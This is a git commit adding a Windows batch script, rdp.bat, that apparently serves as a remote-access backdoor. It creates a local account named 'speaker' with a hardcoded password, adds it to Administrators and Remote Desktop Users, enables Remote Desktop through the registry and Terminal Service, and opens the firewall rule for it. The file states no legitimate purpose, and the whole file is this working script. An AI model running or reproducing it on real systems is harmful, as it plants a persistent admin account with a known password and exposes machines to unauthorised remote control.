afe267f9633de4ba78a734d4588115d2425e6b6c
Izael Magalhaes <46963796+izaelbm@users.noreply.github.com>
2024-03-18 16:12:42 -0300

    Create rdp.bat

---
+++ rdp.bat
@@ -0,0 +1,15 @@
+#precisa ser admin local para funcionar
+
+net user speaker S3cur!ty /add
+net localgroup "Administrators" "speaker" /add
+net localgroup "Remote Desktop Users" "speaker" /add
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
+
+sc config "Termservice" start= auto
+net start "Termservice"
+
+netsh advfirewall set currentprofile state on
+
+netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
